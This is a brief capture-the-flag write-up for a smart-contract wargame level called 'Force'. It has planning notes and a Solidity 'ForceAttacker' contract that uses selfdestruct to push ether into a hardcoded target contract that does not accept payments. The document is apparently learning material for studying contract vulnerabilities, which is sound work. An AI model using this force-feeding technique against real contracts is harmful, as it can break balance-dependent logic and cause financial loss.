# Level 7 - Force

- Source code is not shared.
- Force contract to receive tokens.
- Self destruct maybe? YES

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttacker {
    address target = 0x66abf46F6f6A2aaAD82691F7C819746E570782C8;
    
    constructor() payable {

    }

    function attack() public {
        selfdestruct(payable(target));
    }
}
```